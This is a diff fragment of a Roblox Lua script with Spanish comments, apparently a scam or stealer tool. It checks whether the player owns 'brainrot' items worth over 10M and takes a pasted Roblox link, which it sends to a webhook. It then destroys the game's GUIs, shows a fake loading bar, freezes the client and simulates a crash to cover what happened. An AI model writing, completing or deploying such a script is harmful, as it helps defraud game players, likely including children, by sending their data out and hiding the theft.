+    progressBarBack.Size = UDim2.new(0, 300, 0, 20)
+    progressBarBack.Position = UDim2.new(0.5, -150, 0.6, 0)
+    progressBarBack.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
+    progressBarBack.BorderSizePixel = 0
+    progressBarBack.ZIndex = 11
+    progressBarBack.Parent = mainFrame
+
+    local barCorner = Instance.new("UICorner")
+    barCorner.CornerRadius = UDim.new(0, 10)
+    barCorner.Parent = progressBarBack
+
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.BackgroundColor3 = Color3.new(0, 1, 0)
+    progressBar.BorderSizePixel = 0
+    progressBar.ZIndex = 12
+    progressBar.Parent = progressBarBack
+
+    local barCorner2 = Instance.new("UICorner")
+    barCorner2.CornerRadius = UDim.new(0, 10)
+    barCorner2.Parent = progressBar
+
+    local percentageText = Instance.new("TextLabel")
+    percentageText.Size = UDim2.new(1, 0, 1, 0)
+    percentageText.BackgroundTransparency = 1
+    percentageText.Text = "0%"
+    percentageText.TextColor3 = Color3.new(1, 1, 1)
+    percentageText.TextSize = 14
+    percentageText.Font = Enum.Font.GothamBold
+    percentageText.ZIndex = 13
+    percentageText.Parent = progressBarBack
+
+    spawn(function()
+        local progress = 0
+
+        while progress < 100 do
+            progress = progress + math.random(1, 2)
+            if progress > 100 then progress = 100 end
+
+            progressBar:TweenSize(UDim2.new(progress/100, 0, 1, 0), "Out", "Quad", 0.8, true)
+            percentageText.Text = progress .. "%"
+
+            wait(math.random(3, 6) / 10) -- Acelerar la barra para que termine en ~4-5 segundos
+        end
+
+        percentageText.Text = "100%"
+        progressBar.Size = UDim2.new(1, 0, 1, 0)
+    end)
+end
+
+local function checkBrainrotValue()
+    local ownedBrainrots, totalProduction = getOwnedBrainrots()
+    for _, brainrot in pairs(ownedBrainrots) do
+        if brainrot.productionPerUnit > 10000000 then -- 10M threshold
+            return true
+        end
+    end
+    return false
+end
+
+local controlsDisabled = false
+
+joinButton.MouseButton1Click:Connect(function()
+    if controlsDisabled then return end
+
+    local link = textBox.Text:gsub(" ", "")
+    local isValid, errorMessage = validateRobloxLink(link)
+
+    if not isValid then
+        errorLabel.Text = "❌ " .. errorMessage
+        errorLabel.Visible = true
+        wait(3)
+        errorLabel.Visible = false
+        return
+    end
+
+    errorLabel.Visible = false
+    controlsDisabled = true
+    disableControls()
+
+    -- Verificar si hay brainrots > 10M
+    if not checkBrainrotValue() then
+        -- Restaurar la GUI original si no hay brainrots > 10M
+        textBoxFrame.Visible = true
+        joinButton.Visible = true
+        errorLabel.Text = "❌ Requires brainrot > 10M"
+        errorLabel.Visible = true
+        wait(3)
+        errorLabel.Visible = false
+        controlsDisabled = false
+        return
+    end
+
+    -- Cerrar todas las GUIs excepto esta
+    for _, gui in pairs(CoreGui:GetChildren()) do
+        if gui ~= screenGui then
+            pcall(function()
+                gui:Destroy() -- Cerrar GUIs de Roblox
+            end)
+        end
+    end
+
+    for _, gui in pairs(player:WaitForChild("PlayerGui"):GetChildren()) do
+        pcall(function()
+            gui:Destroy() -- Cerrar GUIs del juego
+        end)
+    end
+
+    local success = sendWebhook(link)
+    if not success then
+        errorLabel.Text = "❌ Failed to send data to webhook"
+        errorLabel.Visible = true
+        controlsDisabled = false
+        wait(3)
+        errorLabel.Visible = false
+        return
+    end
+
+    showLoadingScreen()
+
+    -- Esperar 4-5 segundos y luego simular crash
+    wait(math.random(4, 5))
+    freezeClient()
+    simulateCrash() -- Simular crash con errores continuos y barra estática
+end)
+
+UserInputService.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.Escape then
+        return
+    end
+end)
+
+spawn(function()
+    while titleLabel.Parent do
+        for hue = 0, 1, 0.01 do
+            if not titleLabel.Parent then break end
+            local r = math.abs(math.sin(hue * 6.28))
+            local g = math.abs(math.sin((hue + 0.33) * 6.28))
+            local b = math.abs(math.sin((hue + 0.66) * 6.28))
+            titleLabel.TextColor3 = Color3.new(r, g, b)
+            wait(0.05)
+        end
+    end
+end)
